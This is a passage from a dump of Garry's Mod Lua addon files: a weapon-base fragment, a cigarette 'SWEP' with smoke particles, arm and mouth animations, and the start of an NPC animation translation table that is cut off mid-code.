        if self.RunMouseSensMod then
            return self.RunMouseSensMod
        end
    end
    
    if self.dt.State == SWB_AIMING then
        if self.OverrideAimMouseSens then
            return self.OverrideAimMouseSens
        end
        
        return 1 - math_Clamp(self.ZoomAmount / 100, 0.1, 1)
    end
    
    return 1
end
--PATH addons/cigarette_swep/lua/weapons/weapon_ciga/shared.lua:
-- weapon_ciga/shared.lua
-- Defines common shared code/defaults for ciga SWEP

-- Cigarette SWEP by Mordestein (based on Vape SWEP by Swamp Onions)


SWEP.Author = "Mordestein"

SWEP.Instructions = "LMB: Kruto kurit"

SWEP.PrintName = "Yava"

SWEP.IconLetter	= ""
SWEP.Category = "Cigarette"
SWEP.Slot = 1
SWEP.SlotPos = 0

SWEP.ViewModelFOV = 62 --default

SWEP.BounceWeaponIcon = false

SWEP.ViewModel = "models/mordeciga/mordes/oldcigshib.mdl"
SWEP.WorldModel = "models/mordeciga/mordes/oldcigshib.mdl"
SWEP.Spawnable = true
SWEP.AdminOnly = false

SWEP.Primary.Clipsize = -1
SWEP.Primary.DefaultClip = -1
SWEP.Primary.Automatic = true
SWEP.Primary.Ammo = "none"

SWEP.Secondary.Clipsize = -1
SWEP.Secondary.DefaultClip = -1
SWEP.Secondary.Automatic = false
SWEP.Secondary.Ammo = "none"

SWEP.DrawAmmo = false
SWEP.HoldType = "slam"

SWEP.cigaID = 1

function SWEP:Deploy()
	self:SetHoldType("slam")
end

function SWEP:Initialize()

	if !self.CigaInitialized then
		self.CigaInitialized = true
		self.VElements = {
			["ciga"] = { type = "Model", model = self.ViewModel, bone = "ValveBiped.Bip01_Spine4", rel = "", pos = Vector(-7.1, -2.401, 23.377), angle = Angle(111.039, 10.519, 0), size = Vector(1, 1, 1), color = Color(255, 255, 255, 255), surpresslightning = false, material = "", skin = 0, bodygroup = {} }
		}
		--self.VElements["ciga"].model = self.ViewModel
		self.OldCigaModel = self.ViewModel
		self.ViewModel = "models/weapons/c_slam.mdl"
		self.UseHands = true
		self.ViewModelFlip = true
		self.ShowViewModel = true
		self.ShowWorldModel = true
		self.ViewModelBoneMods = {
			["ValveBiped.Bip01_L_Finger1"] = { scale = Vector(1, 1, 1), pos = Vector(0, 0, 0), angle = Angle(-23.334, -12.223, -32.223) },
			["ValveBiped.Bip01_L_Finger12"] = { scale = Vector(1, 1, 1), pos = Vector(0, 0, 0), angle = Angle(0, -21.112, 0) },
			["ValveBiped.Bip01_L_Finger4"] = { scale = Vector(1, 1, 1), pos = Vector(0, 0, 0), angle = Angle(0, -65.556, 0) },
			["ValveBiped.Bip01_R_UpperArm"] = { scale = Vector(1, 1, 1), pos = Vector(0, 0, 0), angle = Angle(0, 72.222, -41.112) },
			["ValveBiped.Bip01_L_Finger0"] = { scale = Vector(1, 1, 1), pos = Vector(0, 0, 0), angle = Angle(10, 1.11, -1.111) },
			["Detonator"] = { scale = Vector(0.009, 0.009, 0.009), pos = Vector(0, 0, 0), angle = Angle(0, 0, 0) },
			["ValveBiped.Bip01_L_Hand"] = { scale = Vector(1, 1, 1), pos = Vector(0, 0, 0), angle = Angle(-27.778, 1.11, -7.778) },
			["Slam_panel"] = { scale = Vector(0.009, 0.009, 0.009), pos = Vector(0, 0, 0), angle = Angle(0, 0, 0) },
			["ValveBiped.Bip01_L_Finger2"] = { scale = Vector(1, 1, 1), pos = Vector(0, 0, 0), angle = Angle(0, -47.778, 0) },
			["ValveBiped.Bip01_L_Finger3"] = { scale = Vector(1, 1, 1), pos = Vector(0, 0, 0), angle = Angle(0, -43.334, 0) },
			["Slam_base"] = { scale = Vector(0.009, 0.009, 0.009), pos = Vector(0, 0, 0), angle = Angle(0, 0, 0) },
			["ValveBiped.Bip01_R_Hand"] = { scale = Vector(0.009, 0.009, 0.009), pos = Vector(0, 0, 0), angle = Angle(0, 0, 0) }
		}
		
	end

	if CLIENT then
	
		// Create a new table for every weapon instance
		self.VElements = table.FullCopy( self.VElements )
		self.WElements = table.FullCopy( self.WElements )
		self.ViewModelBoneMods = table.FullCopy( self.ViewModelBoneMods )

		self:CreateModels(self.VElements) // create viewmodels
		self:CreateModels(self.WElements) // create worldmodels
		
		// init view model bone build function
		if IsValid(self.Owner) then
			local vm = self.Owner:GetViewModel()
			if IsValid(vm) then
				self:ResetBonePositions(vm)
				
				// Init viewmodel visibility
				if (self.ShowViewModel == nil or self.ShowViewModel) then
					vm:SetColor(Color(255,255,255,255))
				else
					// we set the alpha to 1 instead of 0 because else ViewModelDrawn stops being called
					vm:SetColor(Color(255,255,255,1))
					// ^ stopped working in GMod 13 because you have to do Entity:SetRenderMode(1) for translucency to kick in
					// however for some reason the view model resets to render mode 0 every frame so we just apply a debug material to prevent it from drawing
					vm:SetMaterial("Debug/hsv")			
				end
			end
		end
		
	end
	if self.Initialize2 then self:Initialize2() end
end

function SWEP:PrimaryAttack()
	if SERVER then
		cigaUpdate(self.Owner, self.cigaID)
	end
	self.Weapon:SetNextPrimaryFire(CurTime() + 0.1)
end

function SWEP:SecondaryAttack()
	local pitch = 100 + (self.SoundPitchMod or 0) + (self.Owner:Crouching() and 40 or 0)
	self:EmitSound("kukuepta.wav", 80, pitch + math.Rand(-5,5))
	if SERVER then
		net.Start("cigaTalking")
		net.WriteEntity(self.Owner)
		net.WriteFloat(CurTime() + (0.6*100/pitch))
		net.Broadcast()
	end
end

function SWEP:Reload()
	
end

function SWEP:Holster()
	if SERVER and IsValid(self.Owner) then
		Releaseciga(self.Owner)
	end
	
	if CLIENT and IsValid(self.Owner) then
		local vm = self.Owner:GetViewModel()
		if IsValid(vm) then
			self:ResetBonePositions(vm)
		end
	end
	
	return true
end

SWEP.OnDrop = SWEP.Holster
SWEP.OnRemove = SWEP.Holster
--PATH addons/cigarette_swep/lua/weapons/weapon_ciga_cheap.lua:

-- Cigarette SWEP by Mordestein (based on Vape SWEP by Swamp Onions)

if CLIENT then
	include('weapon_ciga/cl_init.lua')
else
	include('weapon_ciga/shared.lua')
end

SWEP.PrintName = "Belomorkanal"

SWEP.Instructions = "LMB: deshevo kurit"

SWEP.ViewModel = "models/mordeciga/mordes/oldcigshib.mdl"
SWEP.WorldModel = "models/mordeciga/mordes/oldcigshib.mdl"

SWEP.cigaID = 3

SWEP.cigaAccentColor = Vector(1,1,1.1)

--PATH addons/cigarette_swep/lua/weapons/weapon_ciga/cl_init.lua:
-- weapon_ciga/cl_init.lua
-- Defines common clientside code/defaults for ciga SWEP

-- Cigarette SWEP by Mordestein (based on Vape SWEP by Swamp Onions)

include('shared.lua')

if not cigaParticleEmitter then cigaParticleEmitter = ParticleEmitter(Vector(0,0,0)) end

function SWEP:DrawWorldModel()
	local ply = self:GetOwner()

	local cigaScale = self.cigaScale or 1
	self:SetModelScale(cigaScale, 0) 
	self:SetSubMaterial()

	if IsValid(ply) then
		local modelStr = ply:GetModel():sub(1,17)
		local isPony = modelStr=="models/ppm/player" or modelStr=="models/mlp/player" or modelStr=="models/cppm/playe"

		local bn = isPony and "LrigScull" or "ValveBiped.Bip01_R_Hand"
		if ply.cigaArmFullyUp then bn ="ValveBiped.Bip01_Head1" end
		local bon = ply:LookupBone(bn) or 0

		local opos = self:GetPos()
		local oang = self:GetAngles()
		local bp,ba = ply:GetBonePosition(bon)
		if bp then opos = bp end
		if ba then oang = ba end

		if ply.cigaArmFullyUp then
			--head position
			opos = opos + (oang:Forward()*0.95) + (oang:Right()*7) + (oang:Up()*0.035)
			oang:RotateAroundAxis(oang:Forward(),-100)
			oang:RotateAroundAxis(oang:Up(),100)
			opos = opos + (oang:Up()*(cigaScale-1)*-10.25)
		else
			--hand position
				oang:RotateAroundAxis(oang:Forward(),50)
			oang:RotateAroundAxis(oang:Right(),90)
			opos = opos + (oang:Forward()*2) + (oang:Up()*-4.5) + (oang:Right()*-2)
			oang:RotateAroundAxis(oang:Forward(),90)
			oang:RotateAroundAxis(oang:Up(),10)
			opos = opos + (oang:Up()*(cigaScale-1)*-10.25)
			opos = opos + (oang:Up() * 2)
			opos = opos + (oang:Right() * 0.5)
			opos = opos + (oang:Forward() * -1.5)
		end
		self:SetupBones()

		local mrt = self:GetBoneMatrix(0)
		if mrt then
		mrt:SetTranslation(opos)
		mrt:SetAngles(oang)

		self:SetBoneMatrix(0, mrt)
		end
	end

	self:DrawModel()
end

function SWEP:GetViewModelPosition(pos, ang)
	--mouth pos
	local vmpos1=self.cigaVMPos1 or Vector(18.5,-3.4,-3.25)
	local vmang1=self.cigaVMAng1 or Vector(170,-180,20)
	--hand pos
	local vmpos2=self.cigaVMPos2 or Vector(24,-8,-11.2)
	local vmang2=self.cigaVMAng2 or Vector(120,-180,150)

	if not LocalPlayer().cigaArmTime then LocalPlayer().cigaArmTime=0 end
	local lerp = math.Clamp((os.clock()-LocalPlayer().cigaArmTime)*3,0,1)
	if LocalPlayer().cigaArm then lerp = 1-lerp end
	/*
	local newpos = LerpVector(lerp,vmpos1,vmpos2)
	local newang = LerpVector(lerp,vmang1,vmang2)
	--I have a good reason for doing it like this
	newang = Angle(newang.x,newang.y,newang.z) 
	
	pos,ang = LocalToWorld(newpos,newang,pos,ang)*/
	local difvec = Vector(-10,-3.5,-12)--vmpos1 - vmpos2
	local orig = Vector(0,0,0)
	local topos = orig+difvec
	
	local difang = Vector(-30,0,0)--vmang1 - vmang2
	local origang = Vector(0,0,0)
	local toang = origang+difang
	
	
	
	local newpos = LerpVector(lerp,topos,orig)
	local newang = LerpVector(lerp,toang,origang)
	
	newang = Angle(newang.x, newang.y, newang.z)
	
	
	pos,ang = LocalToWorld(newpos,newang,pos,ang)
	return pos, ang
end

sound.Add({
	name = "ciga_inhale",
	channel = CHAN_WEAPON,
	volume = 0.24,
	level = 60,
	pitch = { 95 },
	sound = "cigainhale.wav"
})

net.Receive("ciga",function()
	local ply = net.ReadEntity()
	local amt = net.ReadInt(8)
	local fx = net.ReadInt(8)
	if !IsValid(ply) then return end

	if amt>=50 then
		ply:EmitSound("cigacough1.wav",90)

		for i=1,200 do
			local d=i+10
			if i>140 then d=d+150 end
			timer.Simple((d-1)*0.003,function() ciga_do_pulse(ply, 1, 100, fx) end)
		end

		return
	elseif amt>=35 then
		ply:EmitSound("cigabreath2.wav",75,100,0.7)
	elseif amt>=10 then
		ply:EmitSound("cigabreath1.wav",70,130-math.min(100,amt*2),0.4+(amt*0.005))
	end

	for i=1,amt*2 do
		timer.Simple((i-1)*0.02,function() ciga_do_pulse(ply,math.floor(((amt*2)-i)/10), fx==2 and 100 or 0, fx) end)
	end
end)

net.Receive("cigaArm",function()
	local ply = net.ReadEntity()
	local z = net.ReadBool()
	if !IsValid(ply) then return end
	if ply.cigaArm != z then
		if z then
			timer.Simple(0.3, function() 
				if !IsValid(ply) then return end 
				if ply.cigaArm then ply:EmitSound("ciga_inhale") end
			end)
		else
			ply:StopSound("ciga_inhale")
		end
		ply.cigaArm = z
		ply.cigaArmTime = os.clock()
		local m = 0
		if z then m = 1 end

		for i=0,9 do
			timer.Simple(i/30,function() ciga_interpolate_arm(ply,math.abs(m-((9-i)/10)),z and 0 or 0.2) end)
		end
	end
end)

net.Receive("cigaTalking",function()
	local ply = net.ReadEntity()
	if IsValid(ply) then ply.cigaTalkingEndtime = net.ReadFloat() end
end)

function ciga_interpolate_arm(ply, mult, mouth_delay)
	if !IsValid(ply) then return end
	
	if mouth_delay>0 then 
		timer.Simple(mouth_delay,function() if IsValid(ply) then ply.cigaMouthOpenAmt = mult end end)
	else 
		ply.cigaMouthOpenAmt = mult
	end

	local b1 = ply:LookupBone("ValveBiped.Bip01_R_Upperarm")
	local b2 = ply:LookupBone("ValveBiped.Bip01_R_Forearm")
	if (not b1) or (not b2) then return end
	ply:ManipulateBoneAngles(b1,Angle(20*mult,-62*mult,10*mult))
	ply:ManipulateBoneAngles(b2,Angle(-5*mult,-10*mult,0))
	if mult==1 then ply.cigaArmFullyUp=true else ply.cigaArmFullyUp=false end
end

--this makes the mouth opening work without clobbering other addons
hook.Add("InitPostEntity", "cigaMouthMoveSetup", function()
	timer.Simple(1, function()
		if ciga_OriginalMouthMove ~= nil then return end

		ciga_OriginalMouthMove = GAMEMODE.MouthMoveAnimation
	 
		function GAMEMODE:MouthMoveAnimation(ply)
			--run the base MouthMoveAnimation if player isn't vaping/cigatalking
			if ((ply.cigaMouthOpenAmt or 0) == 0) and ((ply.cigaTalkingEndtime or 0) < CurTime()) then
				return ciga_OriginalMouthMove(GAMEMODE, ply)
			end

			local FlexNum = ply:GetFlexNum() - 1
			if ( FlexNum <= 0 ) then return end
			for i = 0, FlexNum - 1 do
				local Name = ply:GetFlexName(i)
				if ( Name == "jaw_drop" || Name == "right_part" || Name == "left_part" || Name == "right_mouth_drop" || Name == "left_mouth_drop" ) then
					ply:SetFlexWeight(i, math.max(((ply.cigaMouthOpenAmt or 0)*0.5), math.Clamp(((ply.cigaTalkingEndtime or 0)-CurTime())*3.0, 0, 1)*math.Rand(0.1,0.8) ))
				end
			end
		end
	end)
end)

function ciga_do_pulse(ply, amt, spreadadd, fx)
	if !IsValid(ply) then return end

	if ply:WaterLevel()==3 then return end

	if not spreadadd then spreadadd=0 end

	local attachid = ply:LookupAttachment("eyes")
	cigaParticleEmitter:SetPos(LocalPlayer():GetPos())
	
	local angpos = ply:GetAttachment(attachid) or {Ang=Angle(0,0,0), Pos=Vector(0,0,0)}
	local fwd
	local pos
	
	if (ply != LocalPlayer()) then
		fwd = (angpos.Ang:Forward()-angpos.Ang:Up()):GetNormalized()
		pos = angpos.Pos + (fwd*3.5)
	else
		fwd = ply:GetAimVector():GetNormalized()
		pos = ply:GetShootPos() + fwd*1.5 + gui.ScreenToVector( ScrW()/2, ScrH() )*5
	end

	fwd = ply:GetAimVector():GetNormalized()

	for i = 1,amt do
		if !IsValid(ply) then return end
		local particle = cigaParticleEmitter:Add(string.format("particle/smokesprites_00%02d",math.random(7,16)), pos )
		if particle then
			local dir = VectorRand():GetNormalized() * ((amt+5)/10)
			ciga_do_particle(particle, (ply:GetVelocity()*0.25)+(((fwd*9)+dir):GetNormalized() * math.Rand(50,80) * (amt + 1) * 0.2), fx)
		end
	end
end

function ciga_do_particle(particle, vel, fx)
	particle:SetColor(255,255,255,255)
	if fx == 3 then particle:SetColor(100,100,100,100) end
	if fx >= 4 then 
		local c = JuicycigaJuices[fx-3].color
		if c == nil then c = HSVToColor(math.random(0,359),1,1) end
		particle:SetColor(c.r, c.g, c.b, 255)
	end

	local mega = 1
	if fx == 2 then mega = 4 end
	mega = mega * 0.3
	
	particle:SetVelocity( vel * mega )
	particle:SetGravity( Vector(0,0,1.5) )
	particle:SetLifeTime(0)
	particle:SetDieTime(math.Rand(80,100)*0.11*mega)
	particle:SetStartSize(3*mega)
	particle:SetEndSize(40*mega*mega)
	particle:SetStartAlpha(150)
	particle:SetEndAlpha(0)
	particle:SetCollide(true)
	particle:SetBounce(0.25)
	particle:SetRoll(math.Rand(0,360))
	particle:SetRollDelta(0.01*math.Rand(-40,40))
	particle:SetAirResistance(50)
end

matproxy.Add({
	name = "cigaTankColor",
	init = function( self, mat, values )
		self.ResultTo = values.resultvar
	end,
	bind = function( self, mat, ent )
		if ( !IsValid( ent ) ) then return end
		if ent:GetClass()=="viewmodel" then 
			ent=ent:GetOwner()
			if ( !IsValid( ent ) or !ent:IsPlayer() ) then return end
			ent=ent:GetActiveWeapon()
			if ( !IsValid( ent ) ) then return end
		end
		local v = ent.cigaTankColor or Vector(0.3,0.3,0.3)
		if v==Vector(-1,-1,-1) then
			local c = HSVToColor((CurTime()*60)%360,0.9,0.9)
			v = Vector(c.r,c.g,c.b)/255.0
		end
		mat:SetVector(self.ResultTo, v)
	end
})

matproxy.Add({
	name = "cigaAccentColor",
	init = function( self, mat, values )
		self.ResultTo = values.resultvar
	end,
	bind = function( self, mat, ent )
		if ( !IsValid( ent ) ) then return end
		local o = ent:GetOwner()
		if ent:GetClass()=="viewmodel" then 
			if (!IsValid(o)) or (!o:IsPlayer()) then return end
			ent=o:GetActiveWeapon()
			if ( !IsValid( ent ) ) then return end
		end
		local special = false
		local col = ent.cigaAccentColor or special and Vector(1,0.8,0) or Vector(1,1,1)
		if col==Vector(-1,-1,-1) then
			col=Vector(1,1,1)
			if IsValid(o) then col=o:GetWeaponColor() end
		end
		mat:SetVector(self.ResultTo, col)
	end
})


--Swep Construction Kit code--

if CLIENT then

	SWEP.vRenderOrder = nil
	function SWEP:ViewModelDrawn()
		
		local vm = self.Owner:GetViewModel()
		if !IsValid(vm) then return end
		
		if (!self.VElements) then return end
		
		self:UpdateBonePositions(vm)

		if (!self.vRenderOrder) then
			
			// we build a render order because sprites need to be drawn after models
			self.vRenderOrder = {}

			for k, v in pairs( self.VElements ) do
				if (v.type == "Model") then
					table.insert(self.vRenderOrder, 1, k)
				elseif (v.type == "Sprite" or v.type == "Quad") then
					table.insert(self.vRenderOrder, k)
				end
			end
			
		end

		for k, name in ipairs( self.vRenderOrder ) do
		
			local v = self.VElements[name]
			if (!v) then self.vRenderOrder = nil break end
			if (v.hide) then continue end
			
			local model = v.modelEnt
			local sprite = v.spriteMaterial
			
			if (!v.bone) then continue end
			
			local pos, ang = self:GetBoneOrientation( self.VElements, v, vm )
			
			if (!pos) then continue end
			
			if (v.type == "Model" and IsValid(model)) then

				model:SetPos(pos + ang:Forward() * v.pos.x + ang:Right() * v.pos.y + ang:Up() * v.pos.z )
				ang:RotateAroundAxis(ang:Up(), v.angle.y)
				ang:RotateAroundAxis(ang:Right(), v.angle.p)
				ang:RotateAroundAxis(ang:Forward(), v.angle.r)

				model:SetAngles(ang)
				//model:SetModelScale(v.size)
				local matrix = Matrix()
				matrix:Scale(v.size)
				model:EnableMatrix( "RenderMultiply", matrix )
				
				if (v.material == "") then
					model:SetMaterial("")
				elseif (model:GetMaterial() != v.material) then
					model:SetMaterial( v.material )
				end
				
				if (v.skin and v.skin != model:GetSkin()) then
					model:SetSkin(v.skin)
				end
				
				if (v.bodygroup) then
					for k, v in pairs( v.bodygroup ) do
						if (model:GetBodygroup(k) != v) then
							model:SetBodygroup(k, v)
						end
					end
				end
				
				if (v.surpresslightning) then
					render.SuppressEngineLighting(true)
				end
				
				render.SetColorModulation(v.color.r/255, v.color.g/255, v.color.b/255)
				render.SetBlend(v.color.a/255)
				model:DrawModel()
				render.SetBlend(1)
				render.SetColorModulation(1, 1, 1)
				
				if (v.surpresslightning) then
					render.SuppressEngineLighting(false)
				end
				
			elseif (v.type == "Sprite" and sprite) then
				
				local drawpos = pos + ang:Forward() * v.pos.x + ang:Right() * v.pos.y + ang:Up() * v.pos.z
				render.SetMaterial(sprite)
				render.DrawSprite(drawpos, v.size.x, v.size.y, v.color)
				
			elseif (v.type == "Quad" and v.draw_func) then
				
				local drawpos = pos + ang:Forward() * v.pos.x + ang:Right() * v.pos.y + ang:Up() * v.pos.z
				ang:RotateAroundAxis(ang:Up(), v.angle.y)
				ang:RotateAroundAxis(ang:Right(), v.angle.p)
				ang:RotateAroundAxis(ang:Forward(), v.angle.r)
				
				cam.Start3D2D(drawpos, ang, v.size)
					v.draw_func( self )
				cam.End3D2D()

			end
			
		end
		
	end

	function SWEP:GetBoneOrientation( basetab, tab, ent, bone_override )
		
		local bone, pos, ang
		if (tab.rel and tab.rel != "") then
			
			local v = basetab[tab.rel]
			
			if (!v) then return end
			
			// Technically, if there exists an element with the same name as a bone
			// you can get in an infinite loop. Let's just hope nobody's that stupid.
			pos, ang = self:GetBoneOrientation( basetab, v, ent )
			
			if (!pos) then return end
			
			pos = pos + ang:Forward() * v.pos.x + ang:Right() * v.pos.y + ang:Up() * v.pos.z
			ang:RotateAroundAxis(ang:Up(), v.angle.y)
			ang:RotateAroundAxis(ang:Right(), v.angle.p)
			ang:RotateAroundAxis(ang:Forward(), v.angle.r)
				
		else
		
			bone = ent:LookupBone(bone_override or tab.bone)

			if (!bone) then return end
			
			pos, ang = Vector(0,0,0), Angle(0,0,0)
			local m = ent:GetBoneMatrix(bone)
			if (m) then
				pos, ang = m:GetTranslation(), m:GetAngles()
			end
			
			if (IsValid(self.Owner) and self.Owner:IsPlayer() and 
				ent == self.Owner:GetViewModel() and self.ViewModelFlip) then
				ang.r = -ang.r // Fixes mirrored models
			end
		
		end
		
		return pos, ang
	end

	function SWEP:CreateModels( tab )

		if (!tab) then return end

		// Create the clientside models here because Garry says we can't do it in the render hook
		for k, v in pairs( tab ) do
			if (v.type == "Model" and v.model and v.model != "" and (!IsValid(v.modelEnt) or v.createdModel != v.model) and 
					string.find(v.model, ".mdl") and file.Exists (v.model, "GAME") ) then
				
				v.modelEnt = ClientsideModel(v.model, RENDER_GROUP_VIEW_MODEL_OPAQUE)
				if (IsValid(v.modelEnt)) then
					v.modelEnt:SetPos(self:GetPos())
					v.modelEnt:SetAngles(self:GetAngles())
					v.modelEnt:SetParent(self)
					v.modelEnt:SetNoDraw(true)
					v.createdModel = v.model
				else
					v.modelEnt = nil
				end
				
			elseif (v.type == "Sprite" and v.sprite and v.sprite != "" and (!v.spriteMaterial or v.createdSprite != v.sprite) 
				and file.Exists ("materials/"..v.sprite..".vmt", "GAME")) then
				
				local name = v.sprite.."-"
				local params = { ["$basetexture"] = v.sprite }
				// make sure we create a unique name based on the selected options
				local tocheck = { "nocull", "additive", "vertexalpha", "vertexcolor", "ignorez" }
				for i, j in pairs( tocheck ) do
					if (v[j]) then
						params["$"..j] = 1
						name = name.."1"
					else
						name = name.."0"
					end
				end

				v.createdSprite = v.sprite
				v.spriteMaterial = CreateMaterial(name,"UnlitGeneric",params)
				
			end
		end
		
	end
	
	local allbones
	local hasGarryFixedBoneScalingYet = false

	function SWEP:UpdateBonePositions(vm)
		
		if self.ViewModelBoneMods then
			
			if (!vm:GetBoneCount()) then return end
			
			// !! WORKAROUND !! //
			// We need to check all model names :/
			local loopthrough = self.ViewModelBoneMods
			if (!hasGarryFixedBoneScalingYet) then
				allbones = {}
				for i=0, vm:GetBoneCount() do
					local bonename = vm:GetBoneName(i)
					if (self.ViewModelBoneMods[bonename]) then 
						allbones[bonename] = self.ViewModelBoneMods[bonename]
					else
						allbones[bonename] = { 
							scale = Vector(1,1,1),
							pos = Vector(0,0,0),
							angle = Angle(0,0,0)
						}
					end
				end
				
				loopthrough = allbones
			end
			// !! ----------- !! //
			
			for k, v in pairs( loopthrough ) do
				local bone = vm:LookupBone(k)
				if (!bone) then continue end
				
				// !! WORKAROUND !! //
				local s = Vector(v.scale.x,v.scale.y,v.scale.z)
				local p = Vector(v.pos.x,v.pos.y,v.pos.z)
				local ms = Vector(1,1,1)
				if (!hasGarryFixedBoneScalingYet) then
					local cur = vm:GetBoneParent(bone)
					while(cur >= 0) do
						local pscale = loopthrough[vm:GetBoneName(cur)].scale
						ms = ms * pscale
						cur = vm:GetBoneParent(cur)
					end
				end
				
				s = s * ms
				// !! ----------- !! //
				
				if vm:GetManipulateBoneScale(bone) != s then
					vm:ManipulateBoneScale( bone, s )
				end
				if vm:GetManipulateBoneAngles(bone) != v.angle then
					vm:ManipulateBoneAngles( bone, v.angle )
				end
				if vm:GetManipulateBonePosition(bone) != p then
					vm:ManipulateBonePosition( bone, p )
				end
			end
		else
			self:ResetBonePositions(vm)
		end
		   
	end
	 
	function SWEP:ResetBonePositions(vm)
		
		if (!vm:GetBoneCount()) then return end
		for i=0, vm:GetBoneCount() do
			vm:ManipulateBoneScale( i, Vector(1, 1, 1) )
			vm:ManipulateBoneAngles( i, Angle(0, 0, 0) )
			vm:ManipulateBonePosition( i, Vector(0, 0, 0) )
		end
		
	end

	/**************************
		Global utility code
	**************************/

	// Fully copies the table, meaning all tables inside this table are copied too and so on (normal table.Copy copies only their reference).
	// Does not copy entities of course, only copies their reference.
	// WARNING: do not use on tables that contain themselves somewhere down the line or you'll get an infinite loop
	function table.FullCopy( tab )

		if (!tab) then return nil end
		
		local res = {}
		for k, v in pairs( tab ) do
			if (type(v) == "table") then
				res[k] = table.FullCopy(v) // recursion ho!
			elseif (type(v) == "Vector") then
				res[k] = Vector(v.x, v.y, v.z)
			elseif (type(v) == "Angle") then
				res[k] = Angle(v.p, v.y, v.r)
			else
				res[k] = v
			end
		end
		
		return res
		
	end
	
end



--PATH addons/111mod/lua/weapons/weapon_flechettegun/ai_translations.lua:

--[[---------------------------------------------------------
	Name: SetupWeaponHoldTypeForAI
	Desc: Sets up ACT translations from generic activities to NPC specific activies. In a seperate file to clean up the init.lua
		Not all NPCs have support for all animations (for example Citizens don't have pistol animations)
		This only supports the holdtypes the default NPC models can support
		All of these are taken directly from IMPLEMENT_ACTTABLE() macro of the C++ weapons
-----------------------------------------------------------]]
function SWEP:SetupWeaponHoldTypeForAI( t )

	self.ActivityTranslateAI = {}

	-- Default is pistol/revolver for reasons
	self.ActivityTranslateAI[ ACT_IDLE ]					= ACT_IDLE_PISTOL
	self.ActivityTranslateAI[ ACT_IDLE_ANGRY ]				= ACT_IDLE_ANGRY_PISTOL
	self.ActivityTranslateAI[ ACT_RANGE_ATTACK1 ]			= ACT_RANGE_ATTACK_PISTOL
	self.ActivityTranslateAI[ ACT_RELOAD ]					= ACT_RELOAD_PISTOL
	self.ActivityTranslateAI[ ACT_WALK_AIM ]				= ACT_WALK_AIM_PISTOL
	self.ActivityTranslateAI[ ACT_RUN_AIM ]					= ACT_RUN_AIM_PISTOL
	self.ActivityTranslateAI[ ACT_GESTURE_RANGE_ATTACK1 ]	= ACT_GESTURE_RANGE_ATTACK_PISTOL
	self.ActivityTranslateAI[ ACT_RELOAD_LOW ]				= ACT_RELOAD_PISTOL_LOW

	self.ActivityTranslateAI[ ACT_RANGE_ATTACK1_LOW ]		= ACT_RANGE_ATTACK_PISTOL_LOW
	self.ActivityTranslateAI[ ACT_COVER_LOW ]				= ACT_COVER_PISTOL_LOW
	self.ActivityTranslateAI[ ACT_RANGE_AIM_LOW ]			= ACT_RANGE_AIM_PISTOL_LOW
	self.ActivityTranslateAI[ ACT_GESTURE_RELOAD ]			= ACT_GESTURE_RELOAD_PISTOL

	self.ActivityTranslateAI[ ACT_WALK ]					= ACT_WALK_PISTOL
	self.ActivityTranslateAI[ ACT_RUN ]						= ACT_RUN_PISTOL

	self.ActivityTranslateAI[ ACT_IDLE_RELAXED ]			= ACT_IDLE_PISTOL
	self.ActivityTranslateAI[ ACT_IDLE_STIMULATED ]			= ACT_IDLE_STIMULATED
	self.ActivityTranslateAI[ ACT_IDLE_AGITATED ]			= ACT_IDLE_ANGRY_PISTOL
	self.ActivityTranslateAI[ ACT_IDLE_STEALTH ]			= ACT_IDLE_STEALTH_PISTOL

	self.ActivityTranslateAI[ ACT_WALK_RELAXED ]			= ACT_WALK
	self.ActivityTranslateAI[ ACT_WALK_STIMULATED ]			= ACT_WALK_STIMULATED
	self.ActivityTranslateAI[ ACT_WALK_AGITATED ]			= ACT_WALK_AIM_PISTOL
	self.ActivityTranslateAI[ ACT_WALK_STEALTH ]			= ACT_WALK_STEALTH_PISTOL

	self.ActivityTranslateAI[ ACT_RUN_RELAXED ]				= ACT_RUN
	self.ActivityTranslateAI[ ACT_RUN_STIMULATED ]			= ACT_RUN_STIMULATED
	self.ActivityTranslateAI[ ACT_RUN_AGITATED ]			= ACT_RUN_AIM_PISTOL
	self.ActivityTranslateAI[ ACT_RUN_STEALTH ]				= ACT_RUN_STEALTH_PISTOL

	self.ActivityTranslateAI[ ACT_IDLE_AIM_RELAXED ]		= ACT_IDLE_PISTOL
	self.ActivityTranslateAI[ ACT_IDLE_AIM_STIMULATED ]		= ACT_IDLE_ANGRY_PISTOL
	self.ActivityTranslateAI[ ACT_IDLE_AIM_AGITATED ]		= ACT_IDLE_ANGRY_PISTOL
	self.ActivityTranslateAI[ ACT_IDLE_AIM_STEALTH ]		= ACT_IDLE_STEALTH_PISTOL

	self.ActivityTranslateAI[ ACT_WALK_AIM_RELAXED ]		= ACT_WALK
	self.ActivityTranslateAI[ ACT_WALK_AIM_STIMULATED ]		= ACT_WALK_AIM_PISTOL
	self.ActivityTranslateAI[ ACT_WALK_AIM_AGITATED ]		= ACT_WALK_AIM_PISTOL
	self.ActivityTranslateAI[ ACT_WALK_AIM_STEALTH ]		= ACT_WALK_AIM_STEALTH_PISTOL

	self.ActivityTranslateAI[ ACT_RUN_AIM_RELAXED ]			= ACT_RUN
	self.ActivityTranslateAI[ ACT_RUN_AIM_STIMULATED ]		= ACT_RUN_AIM_PISTOL
	self.ActivityTranslateAI[ ACT_RUN_AIM_AGITATED ]		= ACT_RUN_AIM_PISTOL
	self.ActivityTranslateAI[ ACT_RUN_AIM_STEALTH ]			= ACT_RUN_AIM_STEALTH_PISTOL

	self.ActivityTranslateAI[ ACT_CROUCHIDLE_STIMULATED]		= ACT_CROUCHIDLE_STIMULATED
	self.ActivityTranslateAI[ ACT_CROUCHIDLE_AIM_STIMULATED ]	= ACT_RANGE_AIM_PISTOL_LOW
	self.ActivityTranslateAI[ ACT_CROUCHIDLE_AGITATED ]			= ACT_RANGE_AIM_PISTOL_LOW

	self.ActivityTranslateAI[ ACT_READINESS_RELAXED_TO_STIMULATED ]			= ACT_READINESS_PISTOL_RELAXED_TO_STIMULATED
	self.ActivityTranslateAI[ ACT_READINESS_RELAXED_TO_STIMULATED_WALK ]	= ACT_READINESS_PISTOL_RELAXED_TO_STIMULATED_WALK
	self.ActivityTranslateAI[ ACT_READINESS_AGITATED_TO_STIMULATED ]		= ACT_READINESS_PISTOL_AGITATED_TO_STIMULATED
	self.ActivityTranslateAI[ ACT_READINESS_STIMULATED_TO_RELAXED ]			= ACT_READINESS_PISTOL_STIMULATED_TO_RELAXED

	if ( t == "ar2" || t == "smg" ) then

		self.ActivityTranslateAI[ ACT_RANGE_ATTACK1 ]		= ACT_RANGE_ATTACK_AR2
